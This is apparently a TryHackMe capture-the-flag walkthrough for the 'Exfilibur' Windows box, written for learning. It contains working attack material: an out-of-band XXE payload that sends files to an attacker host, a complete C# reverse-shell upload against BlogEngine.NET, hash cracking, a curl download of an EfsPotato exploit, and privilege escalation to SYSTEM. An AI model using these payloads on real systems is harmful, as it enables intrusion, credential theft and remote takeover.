# **Exfilibur - TryHackMe**

*Target Ip. Address: 10.48.171.145*

Let's start with the nmap scan.

```bash
kali@kali:nmap -sV -sC -Pn 10.48.171.145
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-12 05:17 +0000
Nmap scan report for 10.48.171.145 (10.48.171.145)
Host is up (0.040s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: 403 - Forbidden: Access is denied.
|_http-server-header: Microsoft-IIS/10.0
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-03-12T05:18:29+00:00; +2s from scanner time.
| ssl-cert: Subject: commonName=EXFILIBUR
| Not valid before: 2026-03-11T05:15:20
|_Not valid after:  2026-09-10T05:15:20
| rdp-ntlm-info: 
|   Target_Name: EXFILIBUR
|   NetBIOS_Domain_Name: EXFILIBUR
|   NetBIOS_Computer_Name: EXFILIBUR
|   DNS_Domain_Name: EXFILIBUR
|   DNS_Computer_Name: EXFILIBUR
|   Product_Version: 10.0.17763
|_  System_Time: 2026-03-12T05:18:19+00:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1s, deviation: 0s, median: 1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.19 second
```

We have only 2 open ports. Port 80 (http) and Port 3389 (RDP). So, let's start with the website.

We have access denied on the main page, let's search for directories.

```bash
kali@kali:dirb http://10.48.171.145/                                                                                                                               

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Thu Mar 12 05:21:24 2026
URL_BASE: http://10.48.171.145/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.48.171.145/ ----
==> DIRECTORY: http://10.48.171.145/aspnet_client/                                                                                                          
+ http://10.48.171.145/blog (CODE:200|SIZE:23564)                                                                                                           
+ http://10.48.171.145/Blog (CODE:200|SIZE:23564)
```

<img width="1291" height="940" alt="Screenshot 2026-03-12 111445" src="https://github.com/user-attachments/assets/4a9069ea-de13-44e3-be69-dbb47451177c" />

Viewing the source page, we find that it is BlogEngine.NET 3.3.7.0.

There are many vulnerabilites for this BlogEngine version, but we can start with this one, as we have no credentials.

We will use this one: *"https://github.com/irbishop/CVEs/blob/master/2019-10717/README.md"*.

CVE-2019-10717 --> An unauthenticated directory path traversal /blog/App_Data/

<img width="1286" height="908" alt="Screenshot 2026-03-12 112312" src="https://github.com/user-attachments/assets/07e90a54-05a7-4f36-bc13-ba9a531b81a1" />

We found the users.xml, but we cannot read from this path traversal, so we have to leverage another CVE.

We will use this one: *"https://github.com/irbishop/CVEs/blob/master/2019-11392/README.md"*.

CVE-2019-11392 --> An unauthenticated Out-of-band XML External Entity attack.

```bash
kali@kali:cat oob.xml
<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "http://192.168.130.26/exfil.dtd">
<foo>&e1;</foo>
```
```bash
kali@kali:cat exfil.dtd                                                                                                                                            
<!ENTITY % p1 SYSTEM "file:///C:/WINDOWS/win.ini">
<!ENTITY % p2 "<!ENTITY e1 SYSTEM 'http://192.168.130.26/EX?%p1;'>">
%p2;
```

Start a python server.

```bash
kali@kali:python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Visit the page at : *"http://10.48.171.145/blog/syndication.axd?apml=http://192.168.130.26/oob.xml"*.

<img width="1289" height="273" alt="image" src="https://github.com/user-attachments/assets/23cb4e09-1b4c-446b-9771-51e5554e36ff" />

We get an error, probably because of firewall. Let's set common ports like 445.

Visit the page at: *"http://10.48.171.145/blog/syndication.axd?apml=http://192.168.130.26:445/oob.xml*".

```bash
kali@kali:python3 -m http.server 445                                                                                                                             
Serving HTTP on 0.0.0.0 port 445 (http://0.0.0.0:445/) ...
10.48.171.145 - - [12/Mar/2026 05:57:27] "GET /oob.xml HTTP/1.1" 200 -
10.48.171.145 - - [12/Mar/2026 05:57:27] "GET /exfil.dtd HTTP/1.1" 200 -
10.48.171.145 - - [12/Mar/2026 05:57:27] code 404, message File not found
10.48.171.145 - - [12/Mar/2026 05:57:27] "GET /EX?;%20for%2016-bit%20app.....%0D%0A[Mail]%0D%0AMAPI=1 HTTP/1.1" 404 -
```

That was successful, now we can exfiltrate the users.xml file, we found earlier.

```bash
kali@kali:cat exfil.dtd                                                                                                                                            
<!ENTITY % p1 SYSTEM "file:///C:/inetpub/wwwroot/blog/App_Data/users.xml">
<!ENTITY % p2 "<!ENTITY e1 SYSTEM 'http://192.168.130.26:445/EX?%p1;'>">
%p2;
```

Now continue the same steps.

```bash
kali@kali:python3 -m http.server 445                                                                                                                               
Serving HTTP on 0.0.0.0 port 445 (http://0.0.0.0:445/) ...
10.48.171.145 - - [12/Mar/2026 05:59:45] "GET /oob.xml HTTP/1.1" 200 -
10.48.171.145 - - [12/Mar/2026 05:59:45] "GET /exfil.dtd HTTP/1.1" 200 -
10.48.171.145 - - [12/Mar/2026 05:59:45] code 404, message File not found
10.48.171.145 - - [12/Mar/2026 05:59:45] "GET /EX?%3CUsers%3E%0.....%0D%0A%3C/Users%3E HTTP/1.1" 404 -
```

That was successful. Now let's make a clear view of the output by using cyberchef URL Decode.

```output
<Users>
  <User>
    <UserName>Admin</UserName>
    <Password>wob.....w0=</Password>
    <Email>post@example.com</Email>
    <LastLoginTime>2007-12-05 20:46:40</LastLoginTime>
  </User>
  <!--
<User>
    <UserName>merlin</UserName>
    <Password></Password>
    <Email>mark@email.com</Email>
    <LastLoginTime>2023-08-11 10:58:51</LastLoginTime>
  </User>
-->
  <User>
    <UserName>guest</UserName>
    <Password>hJg8.....huw=</Password>
    <Email>guest@email.com</Email>
    <LastLoginTime>2023-08-12 08:47:51</LastLoginTime>
  </User>
</Users>
```

Also, note while doing URL decoding, there may be spaces in the hash, replace the space with '+' sign.

The hashes are encoded in base64, we can decode then and convert to hex format.

```bash
kali@kali:echo "wob.....w0=" | base64 -d | xxd -p -c 32                                                                           
c286d2fc0bca....70d

kali@kali:echo "hJg8Y.....XBhuw=" | base64 -d | xxd -p -c 32                                                                           
84983c.....115c186ec
````

Now, we can crack the hash using John the Ripper.

```bash
kalI@kali:john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256                                                                                
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (Raw-SHA256 [SHA256 128/128 SSE2 4x])
Warning: poor OpenMP scalability for this hash type, consider --fork=4
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
g.....t            (guest)     
1g 0:00:00:00 DONE (2026-03-12 06:06) 1.010g/s 14488Kp/s 14488Kc/s 14620KC/s (454579)..*7¡Vamos!
Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
Session completed.
```

We were able to crack the hash for guest. Whatever could have guess that as well. Now, we can login with the password for guest.

<img width="1289" height="909" alt="Screenshot 2026-03-12 115519" src="https://github.com/user-attachments/assets/bc56370b-13a3-417d-b89f-b8d2cb950ae8" />

We see a draft page in the dashboard.

<img width="1291" height="947" alt="Screenshot 2026-03-12 115658" src="https://github.com/user-attachments/assets/7d645f86-faa5-456b-9980-63b387500bb4" />

We find the credentials, and it hints it is of administrator. We might need those later.

Now, we are authenticated, we can use this: *"https://github.com/irbishop/CVEs/blob/master/2019-10720/README.md"*.

CVE-2019-10720 --> Authenticated Remote Code Execution

We will use burp suite to send the request.

```request
POST /blog/api/upload?action=file HTTP/1.1
Host: 10.48.171.145
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/plain
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=---------------------------12143974373743678091868871063
Content-Length: 2079

-----------------------------12143974373743678091868871063
Content-Disposition: form-data; filename="PostView.ascx"

<%@ Control Language="C#" AutoEventWireup="true" EnableViewState="false" Inherits="BlogEngine.Core.Web.Controls.PostViewBase" %>
<%@ Import Namespace="BlogEngine.Core" %>

<script runat="server">
	static System.IO.StreamWriter streamWriter;

    protected override void OnLoad(EventArgs e) {
        base.OnLoad(e);

		using(System.Net.Sockets.TcpClient client = new System.Net.Sockets.TcpClient("192.168.130.26", 445)) {
			using(System.IO.Stream stream = client.GetStream()) {
				using(System.IO.StreamReader rdr = new System.IO.StreamReader(stream)) {
					streamWriter = new System.IO.StreamWriter(stream);

					StringBuilder strInput = new StringBuilder();

					System.Diagnostics.Process p = new System.Diagnostics.Process();
					p.StartInfo.FileName = "cmd.exe";
					p.StartInfo.CreateNoWindow = true;
					p.StartInfo.UseShellExecute = false;
					p.StartInfo.RedirectStandardOutput = true;
					p.StartInfo.RedirectStandardInput = true;
					p.StartInfo.RedirectStandardError = true;
					p.OutputDataReceived += new System.Diagnostics.DataReceivedEventHandler(CmdOutputDataHandler);
					p.Start();
					p.BeginOutputReadLine();

					while(true) {
						strInput.Append(rdr.ReadLine());
						p.StandardInput.WriteLine(strInput);
						strInput.Remove(0, strInput.Length);
					}
				}
			}
		}
    }

    private static void CmdOutputDataHandler(object sendingProcess, System.Diagnostics.DataReceivedEventArgs outLine) {
		StringBuilder strOutput = new StringBuilder();

       	if (!String.IsNullOrEmpty(outLine.Data)) {
       		try {
                	strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
			} catch (Exception err) { }
        }
    }
</script>
<asp:PlaceHolder ID="phContent" runat="server" EnableViewState="false"></asp:PlaceHolder>

-----------------------------12143974373743678091868871063--
```

```response
HTTP/1.1 201 Created
Cache-Control: no-cache
Pragma: no-cache
Content-Type: application/json; charset=utf-8
Expires: -1
Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET
Date: Thu, 12 Mar 2026 06:24:23 GMT
Connection: close
Content-Length: 72

"/blog/file.axd?file=%2f2026%2f03%2fPostView.ascx|PostView.ascx (1.9KB)"
```

That was successful, start a listener.

```bash
kali@kali:penelope -p 445
[+] Listening for reverse shells on 0.0.0.0:445 →  127.0.0.1 • 192.168.1.60 • 172.17.0.1 • 172.18.0.1 • 192.168.130.26
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```

Before that, we have to find the location of upload, we can utilize the path traversal vulnerability we used before.

It was found at this url, which is basically year and month appended at the end *"http://10.48.171.145/blog/api/filemanager?path=/../../../blog/App_Data/files/2026/03*"

<img width="1290" height="620" alt="image" src="https://github.com/user-attachments/assets/ae2bb357-67a0-4c18-b016-881f86e84178" />

Now, we can make a request with curl, to execute the payload.

```bash
curl -b "theme=../../App_Data/files/2026/03" http://10.48.171.145/blog
```

With take some time, but should receive a reverse shell.

```bash
penelope -p 445
[+] Listening for reverse shells on 0.0.0.0:445 →  127.0.0.1 • 192.168.1.60 • 172.17.0.1 • 172.18.0.1 • 192.168.130.26
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from EXFILIBUR~10.48.171.145-Microsoft_Windows_Server_2019_Datacenter-x64-based_PC 😍 Assigned SessionID <1>
[+] Added readline support...
[+] Interacting with session [1], Shell Type: Readline, Menu key: Ctrl-D 
[+] Logging to /home/kali/.penelope/sessions/EXFILIBUR~10.48.171.145-Microsoft_Windows_Server_2019_Datacenter-x64-based_PC/2026_03_12-06_30_27-701.log 📜
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
c:\windows\system32\inetsrv>
```

We have no flag, but we find a username, who might have the password we found earlier.

```bash
C:\Users>dir                                                                                                                                                 
 Volume in drive C has no label.                                                                                                                             
 Volume Serial Number is A8A4-C362                                                                                                                           
 Directory of C:\Users                                                                                                                                       
08/21/2023  08:36 AM    <DIR>          .                                                                                                                     
08/21/2023  08:36 AM    <DIR>          ..                                                                                                                    
08/09/2023  05:28 PM    <DIR>          .NET v2.0                                                                                                             
08/09/2023  05:28 PM    <DIR>          .NET v2.0 Classic                                                                                                     
08/09/2023  05:28 PM    <DIR>          .NET v4.5                                                                                                             
08/09/2023  05:28 PM    <DIR>          .NET v4.5 Classic
03/12/2026  05:26 AM    <DIR>          Administrator
08/09/2023  05:28 PM    <DIR>          Classic .NET AppPool
12/21/2023  02:48 PM    <DIR>          kingarthy
08/11/2023  11:47 AM    <DIR>          merlin
09/04/2023  07:57 PM    <DIR>          Public
               0 File(s)              0 bytes
              11 Dir(s)   9,871,732,736 bytes free
```

We will login as kingarthy via RDP.

```bash
xfreerdp3 /u:kingarthy /p:'Ex.....37' /v:10.48.171.145 /dynamic-resolution /cert:ignore /drive:share,/home/kali/tools                        
[06:14:59:370] [32491:00007eeb] [WARN][com.freerdp.client.common.cmdline] - [warn_credential_args]: Using /p is insecure
[06:14:59:370] [32491:00007eeb] [WARN][com.freerdp.client.common.cmdline] - [warn_credential_args]: Passing credentials or secrets via command line might expose these in the process list
[06:14:59:370] [32491:00007eeb] [WARN][com.freerdp.client.common.cmdline] - [warn_credential_args]: Consider using one of the following (more secure) alternatives:
```

<img width="1024" height="791" alt="image" src="https://github.com/user-attachments/assets/0d165906-32ed-4f41-a08b-fe2e43b7d165" />

That was successful.

We find our first flag at Desktop.

<img width="811" height="158" alt="Screenshot 2026-03-12 122104" src="https://github.com/user-attachments/assets/2c57715f-c3c5-467c-b740-21d17b62dd96" />

We can run as Administrator for this user, but we have some disabled privileges.

```powershell
PS C:\Windows\system32> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                              State
============================= ======================================== ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled
SeRestorePrivilege            Restore files and directories            Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Disabled
```

Let's check if user merlin has any orivileges.

```bash
C:\Users>whoami /priv
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

Bingo!!! We have SeImpersonatePrivilege.

I tried to use GodPotato, but the Windows Defender is active, and I cannot execute anything with it.

I found that we can use EFsPotato as well. I successfully downloaded it.

```bash
C:\Users\merlin\Desktop>curl http://192.168.130.26:446/EfsPotato.cs -o ep.cs
```

Compile it.

```bash
C:\Users\merlin\Desktop>C:\Windows\Microsoft.Net\Framework\v4.0.30319\csc.exe ep.cs -nowarn:1691,618
Microsoft (R) Visual C# Compiler version 4.8.3761.0
for C# 5
Copyright (C) Microsoft Corporation. All rights reserved.
This compiler is provided as part of the Microsoft (R) .NET Framework, but only supports language versions up to C# 5, which is no longer the latest version. For compilers that support newer versions of the C# programming language, see http://go.microsoft.com/fwlink/?LinkID=533240
```

```bash
C:\Users\merlin\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362
 Directory of C:\Users\merlin\Desktop
03/12/2026  06:53 AM    <DIR>          .
03/12/2026  06:53 AM    <DIR>          ..
06/21/2016  03:36 PM               527 EC2 Feedback.website
06/21/2016  03:36 PM               554 EC2 Microsoft Windows Guide.website
03/12/2026  06:53 AM            25,441 ep.cs
03/12/2026  06:53 AM            17,920 ep.exe
               4 File(s)         44,442 bytes
               2 Dir(s)   9,839,611,904 bytes free
```

There is ep.exe, compiled for us. Let's see if this works.

```bash
C:\Users\merlin\Desktop>.\ep.exe whoami
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]
[+] Current user: EXFILIBUR\merlin
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=139a640)
[+] Get Token: 872
[!] process with pid: 4708 created.
==============================
nt authority\system
```

That was successful. Let's copy the root flag in our directory.

```bash
C:\Users\merlin\Desktop>.\ep.exe "cmd.exe /c type C:\Users\Administrator\Desktop\root.txt > C:\Users\merlin\Desktop\flag.txt"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]
[+] Current user: EXFILIBUR\merlin
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=fb3030)
[+] Get Token: 788
[!] process with pid: 5376 created.
==============================
The system cannot find the file specified.
```

Well, root.txt was not found. Maybe it has some other names kept as a obstacle. Let's do directory listing of Administrator desktop.

```bash
C:\Users\merlin\Desktop>.\ep.exe "cmd.exe /c dir C:\Users\Administrator\Desktop > C:\Users\merlin\Desktop\contents.txt"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]
[+] Current user: EXFILIBUR\merlin
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=954e80)
[+] Get Token: 848
[!] process with pid: 1392 created.
==============================
```

```bash
C:\Users\merlin\Desktop>type contents.txt
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362
 Directory of C:\Users\Administrator\Desktop
08/21/2023  08:48 AM    <DIR>          .
08/21/2023  08:48 AM    <DIR>          ..
06/21/2016  03:36 PM               527 EC2 Feedback.website
06/21/2016  03:36 PM               554 EC2 Microsoft Windows Guide.website
08/21/2023  08:48 AM                39 root.txt.txt
               3 File(s)          1,120 bytes
               2 Dir(s)   9,839,276,032 bytes free
```

So, it was root.txt.txt. Now, we can copy it.

```bash
C:\Users\merlin\Desktop>.\ep.exe "cmd.exe /c type C:\Users\Administrator\Desktop\root.txt.txt > C:\Users\merlin\Desktop\flag.txt"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]
[+] Current user: EXFILIBUR\merlin
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=11add80)
[+] Get Token: 848
[!] process with pid: 1956 created.
==============================
```

Let's read the final flag that is copied on our desktop and end this challenge.

```bash
C:\Users\merlin\Desktop>type flag.txt
THM{ST.....OT}
```
